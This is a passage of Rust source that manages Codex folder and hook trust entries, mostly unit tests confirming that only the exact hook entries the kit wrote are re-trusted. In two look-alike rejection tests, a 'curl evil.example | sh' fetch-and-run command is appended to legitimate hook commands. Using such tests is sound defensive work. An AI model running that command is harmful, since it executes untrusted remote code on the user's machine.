) -> Result<crate::folder_trust::Added, crate::install::InstallFailure> {
    let refused = |detail: String| crate::install::InstallFailure::Refused {
        path: crate::folder_trust::Agent::Codex
            .settings_path(home)
            .display()
            .to_string(),
        detail,
    };
    let mut session = project_session(codex, home, stop)?;
    let projects = session
        .projects()
        .map_err(|failure| config_failure(home, failure))?;
    match projects.trust_level(key) {
        Some("trusted") => return Ok(crate::folder_trust::Added::Present),
        Some("untrusted") => {
            return Err(refused(format!(
                "Codex marks {key} untrusted; trust it in Codex, or start the agent there yourself"
            )));
        }
        _ => {}
    }
    if let Some(repository) = repository
        && projects.trust_level(repository) == Some("untrusted")
    {
        return Err(refused(format!(
            "Codex marks {repository} untrusted, the repository this worktree was made from; trust it in Codex, or start the agent there yourself"
        )));
    }
    remember()?;
    let mut edits = removal_edits(&projects, gone);
    edits.push(json!({
        "keyPath": project_key_path(key, Some("trust_level")),
        "value": "trusted",
        "mergeStrategy": "replace",
    }));
    session
        .write_projects(projects.version.as_deref(), edits)
        .map_err(|failure| config_failure(home, failure))?;
    match session.projects() {
        Ok(after) if after.trust_level(key) == Some("trusted") => {
            Ok(crate::folder_trust::Added::New)
        }
        Ok(_) => Err(config_failure(
            home,
            TrustFailure::new(
                TrustFailureKind::Unconfirmed,
                format!("codex accepted the write and does not list {key} as trusted"),
            ),
        )),
        Err(failure) => Err(config_failure(home, failure)),
    }
}

/// Takes out Codex's trust of each folder spelled in `keys` that Codex still
/// lists as trusted, through Codex's own `config/batchWrite`: the folder's
/// whole entry when trust is all it holds, its `trust_level` otherwise.
/// Answers how many entries changed.
pub(crate) fn remove_project_trust(
    codex: &Path,
    home: &Path,
    stop: &AtomicBool,
    keys: &[String],
) -> Result<usize, crate::install::InstallFailure> {
    let mut session = project_session(codex, home, stop)?;
    let projects = session
        .projects()
        .map_err(|failure| config_failure(home, failure))?;
    let edits = removal_edits(&projects, keys);
    if edits.is_empty() {
        return Ok(0);
    }
    let removed = edits.len();
    session
        .write_projects(projects.version.as_deref(), edits)
        .map_err(|failure| config_failure(home, failure))?;
    Ok(removed)
}

/// The edits that take out Codex's trust of each folder spelled in `keys`
/// that Codex still lists as trusted: the folder's whole entry when trust is
/// all it holds, its `trust_level` otherwise.
fn removal_edits(projects: &Projects, keys: &[String]) -> Vec<Value> {
    keys.iter()
        .filter_map(|key| {
            let (found, entry) = projects.entry(key)?;
            if entry.get("trust_level").and_then(Value::as_str) != Some("trusted") {
                return None;
            }
            let field = (entry.len() > 1).then_some("trust_level");
            Some(json!({
                "keyPath": project_key_path(found, field),
                "value": Value::Null,
                "mergeStrategy": "replace",
            }))
        })
        .collect()
}

/// A file Codex could not use, as `hooks/list` reports it.
#[derive(Clone, Debug, Deserialize)]
struct ListError {
    path: String,
    message: String,
}

/// What `hooks/list` answered, across every cwd it lists.
struct Answer {
    hooks: Vec<Listed>,
    errors: Vec<ListError>,
    warnings: Vec<String>,
}

fn hooks_of(answer: &Value) -> Result<Answer, String> {
    let entries = answer
        .get("data")
        .and_then(Value::as_array)
        .ok_or_else(|| "there is no data list".to_owned())?;
    let mut hooks = Vec::new();
    let mut errors = Vec::new();
    let mut warnings = Vec::new();
    for entry in entries {
        if let Some(reported) = entry.get("warnings").and_then(Value::as_array) {
            warnings.extend(reported.iter().filter_map(Value::as_str).map(str::to_owned));
        }
        if let Some(reported) = entry.get("errors").and_then(Value::as_array) {
            for error in reported {
                errors.push(
                    serde_json::from_value::<ListError>(error.clone())
                        .map_err(|error| error.to_string())?,
                );
            }
        }
        let listed = entry
            .get("hooks")
            .and_then(Value::as_array)
            .ok_or_else(|| "an entry has no hooks list".to_owned())?;
        for hook in listed {
            hooks.push(
                serde_json::from_value::<Listed>(hook.clone())
                    .map_err(|error| error.to_string())?,
            );
        }
    }
    Ok(Answer {
        hooks,
        errors,
        warnings,
    })
}

/// Feeds the child's lines to the session, stopping at the end of output or
/// when it prints more than the caps allow.
fn read_lines(stdout: impl Read, sender: &mpsc::Sender<Line>) {
    let mut reader = BufReader::new(stdout);
    let mut total = 0usize;
    loop {
        let mut line = Vec::new();
        let read = (&mut reader)
            .take(LINE_CAP as u64 + 1)
            .read_until(b'\n', &mut line);
        match read {
            Ok(0) | Err(_) => break,
            Ok(count) => {
                total += count;
                if line.len() > LINE_CAP || total > OUTPUT_CAP {
                    let _ = sender.send(Line::Overflow);
                    return;
                }
            }
        }
        if let Ok(message) = serde_json::from_slice::<Value>(&line)
            && sender.send(Line::Message(message)).is_err()
        {
            return;
        }
    }
    let _ = sender.send(Line::Eof);
}

#[cfg(test)]
mod tests {
    use super::*;

    const HELPER: &str = "/kit/hide-agent-hooks";

    fn expected() -> Vec<Expected> {
        expected_entries(Path::new(HELPER), &[])
    }

    fn hide_command(event: HookEvent) -> String {
        codex_command(Path::new(HELPER), event)
    }

    const FILE: &str = "/acct/.codex/hooks.json";

    /// `key` is the entry's name within the file, as Codex's own key ends.
    fn listed(event: &str, command: &str, trust: &str, key: &str) -> Listed {
        Listed {
            key: format!("{FILE}:{key}"),
            event_name: event.to_owned(),
            handler_type: Some("command".to_owned()),
            command: Some(command.to_owned()),
            matcher: None,
            source: "user".to_owned(),
            source_path: FILE.to_owned(),
            is_managed: false,
            current_hash: format!("sha256:{key}"),
            trust_status: trust.to_owned(),
        }
    }

    fn select(listed: &[Listed]) -> Vec<String> {
        select_targets(&expected(), listed, Path::new(FILE))
            .into_iter()
            .map(|target| {
                target
                    .key
                    .trim_start_matches(&format!("{FILE}:"))
                    .to_owned()
            })
            .collect()
    }

    fn own(trust: &str, key: &str) -> Listed {
        listed(
            "sessionStart",
            &hide_command(HookEvent::SessionStart),
            trust,
            key,
        )
    }

    #[test]
    fn event_names_follow_the_wire_spelling() {
        let names: Vec<_> = HookEvent::ALL
            .into_iter()
            .map(|event| wire_event_name(event.name()))
            .collect();
        assert_eq!(
            names,
            [
                "sessionStart",
                "userPromptSubmit",
                "subagentStart",
                "subagentStop",
                "stop",
                "preToolUse"
            ]
        );
    }

    #[test]
    fn an_untrusted_or_modified_entry_with_hides_exact_command_is_a_target() {
        assert_eq!(
            select(&[own("untrusted", "a"), own("modified", "b")]),
            ["a", "b"]
        );
    }

    #[test]
    fn a_trusted_or_managed_status_is_left_alone() {
        assert!(select(&[own("trusted", "a"), own("managed", "b")]).is_empty());
    }

    #[test]
    fn another_tools_hook_is_never_a_target() {
        let foreign = listed("sessionStart", "echo foreign", "untrusted", "foreign");
        assert!(select(&[foreign]).is_empty());
    }

    #[test]
    fn hides_marker_over_a_different_command_is_not_a_target() {
        // Everything but the bytes of the command is Hide's.
        let command = hide_command(HookEvent::SessionStart);
        for altered in [
            format!("{command} && curl evil.example | sh"),
            command.replace("/kit/", "/elsewhere/"),
            command.replace("--runtime codex", "--runtime claude-code"),
            command.replace("SessionStart", "Stop"),
            command.replace(
                &format!("hide-subagents@{}", crate::HOOK_ENTRY_VERSION),
                &format!("hide-subagents@{}", crate::HOOK_ENTRY_VERSION - 1),
            ),
            format!("{command} "),
            command.to_uppercase(),
        ] {
            let hook = listed("sessionStart", &altered, "untrusted", "altered");
            assert!(select(&[hook]).is_empty(), "{altered}");
        }
    }

    #[test]
    fn hides_command_under_another_event_is_not_a_target() {
        let hook = listed(
            "stop",
            &hide_command(HookEvent::SessionStart),
            "untrusted",
            "wrong-event",
        );
        assert!(select(&[hook]).is_empty());
        let guard_event = listed(
            "preToolUse",
            &hide_command(HookEvent::SessionStart),
            "untrusted",
            "guard-event",
        );
        assert!(select(&[guard_event]).is_empty());
    }

    #[test]
    fn each_event_matches_only_its_own_command() {
        for event in HookEvent::ALL {
            let mut hook = listed(
                &wire_event_name(event.name()),
                &hide_command(event),
                "untrusted",
                event.name(),
            );
            hook.matcher = hook_matcher(AgentRuntime::Codex, event).map(str::to_owned);
            assert_eq!(select(&[hook]), [event.name()]);
        }
    }

    #[test]
    fn the_guard_entry_is_trusted_only_with_the_matcher_hide_wrote() {
        let command = hide_command(HookEvent::PreToolUse);
        let with = |matcher: Option<&str>| {
            let mut hook = listed("preToolUse", &command, "untrusted", "guard");
            hook.matcher = matcher.map(str::to_owned);
            select(&[hook])
        };
        assert_eq!(
            with(Some(
                "Bash|request_user_input|request_user_input_async|apply_patch|Edit|Write"
            )),
            ["guard"]
        );
        // Codex hashes the matcher into the key, so an entry that runs Hide's
        // command on fewer tools, every tool, or another one is not what Hide
        // wrote: the version before the guardrails' file tools included.
        assert!(with(Some("Bash|request_user_input")).is_empty());
        assert!(with(Some("Bash")).is_empty());
        assert!(with(None).is_empty());
        assert!(with(Some("*")).is_empty());
        assert!(with(Some("apply_patch")).is_empty());
        // The matcher written before Codex 0.162.1's async question tool.
        assert!(with(Some("Bash|request_user_input")).is_empty());
    }

    #[test]
    fn the_same_command_from_a_project_plugin_or_managed_layer_is_not_a_target() {
        for (source, managed) in [
            ("project", false),
            ("plugin", false),
            ("mdm", true),
            ("user", true),
            ("sessionFlags", false),
        ] {
            let mut hook = own("untrusted", "layer");
            hook.source = source.to_owned();
            hook.is_managed = managed;
            assert!(select(&[hook]).is_empty(), "{source} managed={managed}");
        }
    }

    #[test]
    fn the_same_command_from_another_file_is_not_a_target() {
        let mut hook = own("untrusted", "elsewhere");
        hook.source_path = "/acct/project/.codex/hooks.json".to_owned();
        assert!(select(&[hook]).is_empty());
    }

    #[test]
    fn a_matcher_other_than_the_one_hide_writes_or_a_non_command_handler_is_not_a_target() {
        let mut matched = own("untrusted", "matched");
        matched.matcher = Some("startup".to_owned());
        let mut prompt = own("untrusted", "prompt");
        prompt.handler_type = Some("prompt".to_owned());
        prompt.command = None;
        assert!(select(&[matched, prompt]).is_empty());
    }

    #[test]
    fn the_matcher_must_equal_the_one_hide_writes_for_that_event() {
        let mut expected = expected();
        expected[0].matcher = Some("Bash".to_owned());
        let pick = |matcher: Option<&str>| {
            let mut hook = own("untrusted", "guarded");
            hook.matcher = matcher.map(str::to_owned);
            select_targets(&expected, &[hook], Path::new(FILE)).len()
        };
        assert_eq!(pick(Some("Bash")), 1);
        assert_eq!(pick(None), 0);
        assert_eq!(pick(Some("bash")), 0);
        assert_eq!(pick(Some("Bash|Edit")), 0);
    }

    #[test]
    fn one_key_is_recorded_once() {
        assert_eq!(
            select(&[own("untrusted", "a"), own("untrusted", "a")]),
            ["a"]
        );
    }

    #[test]
    fn a_list_answer_is_read_across_every_cwd() {
        let hook = json!({
            "key": "k", "eventName": "stop", "handlerType": "command", "command": "c",
            "matcher": null, "source": "user", "sourcePath": "/p", "isManaged": false,
            "currentHash": "sha256:1", "trustStatus": "untrusted",
            "enabled": true, "timeoutSec": 8, "displayOrder": 0,
        });
        let answer = json!({"data": [{"cwd": "/a", "hooks": [hook.clone()]}, {"cwd": "/b", "hooks": [hook]}]});
        assert_eq!(hooks_of(&answer).unwrap().hooks.len(), 2);
        assert!(hooks_of(&json!({})).is_err());
        assert!(hooks_of(&json!({"data": [{"cwd": "/a"}]})).is_err());
    }

    const HERDR_COMMAND: &str = "bash '/acct/.codex/herdr-agent-state.sh' session";

    fn herdr_entry() -> HookEntry {
        HookEntry {
            event: "SessionStart".to_owned(),
            matcher: None,
            handler_type: "command".to_owned(),
            command: HERDR_COMMAND.to_owned(),
        }
    }

    fn select_with_herdr(recorded: &[HookEntry], listed: &[Listed]) -> Vec<String> {
        select_targets(
            &expected_entries(Path::new(HELPER), recorded),
            listed,
            Path::new(FILE),
        )
        .into_iter()
        .map(|target| {
            target
                .key
                .trim_start_matches(&format!("{FILE}:"))
                .to_owned()
        })
        .collect()
    }

    fn herdr_listed(trust: &str, key: &str) -> Listed {
        listed("sessionStart", HERDR_COMMAND, trust, key)
    }

    #[test]
    fn herdrs_entry_is_a_target_only_when_the_kit_recorded_it() {
        let listed = [herdr_listed("untrusted", "herdr")];
        // The operator's own install: the kit recorded nothing, so Herdr's entry
        // is another tool's hook like any other.
        assert!(select_with_herdr(&[], &listed).is_empty());
        assert_eq!(select_with_herdr(&[herdr_entry()], &listed), ["herdr"]);
        // A trusted one needs nothing, a modified one is trusted again.
        assert!(select_with_herdr(&[herdr_entry()], &[herdr_listed("trusted", "h")]).is_empty());
        assert_eq!(
            select_with_herdr(&[herdr_entry()], &[herdr_listed("modified", "h")]),
            ["h"]
        );
    }

    #[test]
    fn a_look_alike_of_herdrs_command_is_not_a_target() {
        let recorded = [herdr_entry()];
        for altered in [
            "bash '/elsewhere/.codex/herdr-agent-state.sh' session".to_owned(),
            "bash '/acct/.codex/herdr-agent-state.sh' session --evil".to_owned(),
            "bash '/acct/.codex/herdr-agent-state.sh' state".to_owned(),
            format!("{HERDR_COMMAND} && curl evil.example | sh"),
            format!("{HERDR_COMMAND} "),
            HERDR_COMMAND.replace("bash", "sh"),
            "/acct/.codex/herdr-agent-state.sh session".to_owned(),
        ] {
            let hook = listed("sessionStart", &altered, "untrusted", "alike");
            assert!(
                select_with_herdr(&recorded, &[hook]).is_empty(),
                "{altered}"
            );
        }
    }

    #[test]
    fn herdrs_command_under_another_event_matcher_or_handler_or_layer_is_not_a_target() {
        let recorded = [herdr_entry()];
        let mut other_event = herdr_listed("untrusted", "event");
        other_event.event_name = "stop".to_owned();
        let mut matched = herdr_listed("untrusted", "matcher");
        matched.matcher = Some("startup".to_owned());
        let mut prompt = herdr_listed("untrusted", "handler");
        prompt.handler_type = Some("prompt".to_owned());
        let mut project = herdr_listed("untrusted", "project");
        project.source = "project".to_owned();
        let mut managed = herdr_listed("untrusted", "managed");
        managed.is_managed = true;
        let mut elsewhere = herdr_listed("untrusted", "file");
        elsewhere.source_path = "/acct/project/.codex/hooks.json".to_owned();
        for hook in [other_event, matched, prompt, project, managed, elsewhere] {
            let key = hook.key.clone();
            assert!(select_with_herdr(&recorded, &[hook]).is_empty(), "{key}");
        }
    }

    #[test]
    fn a_recorded_entry_never_widens_what_hides_own_entries_match() {
        // Hide's own command under Herdr's event still has to be Hide's.
        let own = own("untrusted", "own");
        assert_eq!(select_with_herdr(&[herdr_entry()], &[own]), ["own"]);
        let stranger = listed("sessionStart", "echo foreign", "untrusted", "foreign");
        assert!(select_with_herdr(&[herdr_entry()], &[stranger]).is_empty());
    }

    #[test]
    fn a_recorded_entry_of_another_handler_type_is_never_expected() {
        let mut recorded = herdr_entry();
        recorded.handler_type = "prompt".to_owned();
        let mut hook = herdr_listed("untrusted", "prompt");
        hook.handler_type = Some("prompt".to_owned());
        assert!(select_with_herdr(&[recorded], &[hook]).is_empty());
    }

    #[test]
    fn a_recorded_guard_style_entry_keeps_its_matcher() {
        let recorded = HookEntry {
            event: "PreToolUse".to_owned(),
            matcher: Some("Bash".to_owned()),
            handler_type: "command".to_owned(),
            command: "x".to_owned(),
        };
        let mut hook = listed("preToolUse", "x", "untrusted", "m");
        hook.matcher = Some("Bash".to_owned());
        assert_eq!(
            select_with_herdr(std::slice::from_ref(&recorded), std::slice::from_ref(&hook)),
            ["m"]
        );
        hook.matcher = None;
        assert!(select_with_herdr(&[recorded], &[hook]).is_empty());
    }

    fn entry(event: &str, command: &str) -> HookEntry {
        HookEntry {
            event: event.to_owned(),
            matcher: None,
            handler_type: "command".to_owned(),
            command: command.to_owned(),
        }
    }

    fn set(entries: &[HookEntry]) -> BTreeSet<HookEntry> {
        entries.iter().cloned().collect()
    }

    #[test]
    fn what_an_install_added_is_what_was_learned() {
        let hide = entry("SessionStart", "hide");
        let herdr = herdr_entry();
        assert_eq!(
            learn_herdr_entries(
                &set(std::slice::from_ref(&hide)),
                &set(&[hide, herdr.clone()]),
                &[]
            ),
            Ok(vec![herdr])
        );
    }

    #[test]
    fn an_install_that_changed_nothing_keeps_the_recorded_entries_still_in_the_file() {
        let herdr = herdr_entry();
        let both = set(&[entry("Stop", "other"), herdr.clone()]);
        assert_eq!(
            learn_herdr_entries(&both, &both, std::slice::from_ref(&herdr)),
            Ok(vec![herdr.clone()])
        );
        // Taken out by hand since: nothing is named that is not there.
        let without = set(&[entry("Stop", "other")]);
        assert_eq!(
            learn_herdr_entries(&without, &without, &[herdr]),
            Ok(vec![])
        );
        // Nothing recorded and nothing added: the entry already there is not
        // Herdr's write as far as the kit saw.
        assert_eq!(learn_herdr_entries(&both, &both, &[]), Ok(vec![]));
    }

    #[test]
    fn a_new_entry_and_a_recorded_one_still_in_the_file_are_both_learned() {
        let herdr = herdr_entry();
        let second = entry("Stop", "second herdr entry");
        let before = set(&[herdr.clone(), entry("Stop", "other")]);
        let mut after = before.clone();
        after.insert(second.clone());
        let learned = learn_herdr_entries(&before, &after, std::slice::from_ref(&herdr)).unwrap();
        assert_eq!(learned.len(), 2);
        assert!(learned.contains(&herdr) && learned.contains(&second));
    }

    #[test]
    fn herdr_replacing_its_own_recorded_entry_is_followed() {
        let old = herdr_entry();
        let new = entry(
            "SessionStart",
            "bash '/acct/.codex/herdr-agent-state.sh' session --v2",
        );
        let before = set(&[old.clone(), entry("Stop", "other")]);
        let after = set(&[new.clone(), entry("Stop", "other")]);
        assert_eq!(learn_herdr_entries(&before, &after, &[old]), Ok(vec![new]));
    }

    #[test]
    fn a_removal_or_edit_of_anyone_elses_entry_in_the_window_teaches_nothing() {
        let herdr = herdr_entry();
        let theirs = entry("Stop", "other tool");
        let before = set(std::slice::from_ref(&theirs));
        // Removed.
        let removed = set(std::slice::from_ref(&herdr));
        assert_eq!(
            learn_herdr_entries(&before, &removed, &[]),
            Err(NotLearned::Changed(1))
        );
        // Edited in place: the old entry is gone, a new one is there.
        let edited = set(&[herdr, entry("Stop", "other tool, edited")]);
        assert_eq!(
            learn_herdr_entries(&before, &edited, &[]),
            Err(NotLearned::Changed(1))
        );
        // A recorded entry removed alongside is not a reason of its own.
        assert!(learn_herdr_entries(&set(&[herdr_entry()]), &set(&[]), &[herdr_entry()]).is_ok());
    }

    #[test]
    fn an_install_that_added_a_pile_teaches_nothing() {
        let many: Vec<HookEntry> = (0..=MAX_LEARNED_ENTRIES)
            .map(|n| entry("SessionStart", &format!("c{n}")))
            .collect();
        assert_eq!(
            learn_herdr_entries(&set(&[]), &set(&many), &[]),
            Err(NotLearned::TooMany(MAX_LEARNED_ENTRIES + 1))
        );
        assert!(learn_herdr_entries(&set(&[]), &set(&many[..MAX_LEARNED_ENTRIES]), &[]).is_ok());
    }

    #[test]
    fn the_entries_are_read_from_the_file_by_event_matcher_type_and_command() {
        let home = tempfile::tempdir().unwrap();
        assert_eq!(hook_entries(home.path()), Ok(BTreeSet::new()));
        let dir = home.path().join(".codex");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("hooks.json"),
            json!({"hooks": {
                "SessionStart": [
                    {"hooks": [{"type": "command", "command": "a", "timeout": 10}]},
                    {"matcher": "Bash", "hooks": [{"type": "command", "command": "b"}, {"type": "prompt"}]}
                ],
                "Stop": []
            }})
            .to_string(),
        )
        .unwrap();
        let found = hook_entries(home.path()).unwrap();
        assert_eq!(found.len(), 2);
        assert!(found.contains(&entry("SessionStart", "a")));
        assert!(
            found
                .iter()
                .any(|e| e.command == "b" && e.matcher.as_deref() == Some("Bash"))
        );
        std::fs::write(dir.join("hooks.json"), "{ not json").unwrap();
        assert!(hook_entries(home.path()).is_err());
    }

    #[test]
    fn a_key_that_names_another_file_is_not_a_target() {
        let mut hook = own("untrusted", "k");
        hook.key = "/elsewhere/hooks.json:session_start:0:0".to_owned();
        assert!(select(&[hook]).is_empty());
    }

    #[test]
    fn an_unknown_method_is_told_from_bad_parameters_by_its_message() {
        // The shape codex-cli 0.160.0 answers for a method it does not have.
        let unknown = "Invalid request: unknown variant `hooks/list`, expected one of `initialize`, `thread/start`";
        assert!(method_unknown("hooks/list", INVALID_REQUEST, unknown));
        assert!(method_unknown(
            "hooks/list",
            METHOD_NOT_FOUND,
            "Method not found"
        ));
        assert!(!method_unknown(
            "hooks/list",
            INVALID_REQUEST,
            "Invalid request: missing field `cwds`"
        ));
        assert!(!method_unknown(
            "hooks/list",
            INVALID_REQUEST,
            "Invalid request: unknown variant `config/batchWrite`"
        ));
        assert!(!method_unknown("hooks/list", -32603, unknown));
    }
}
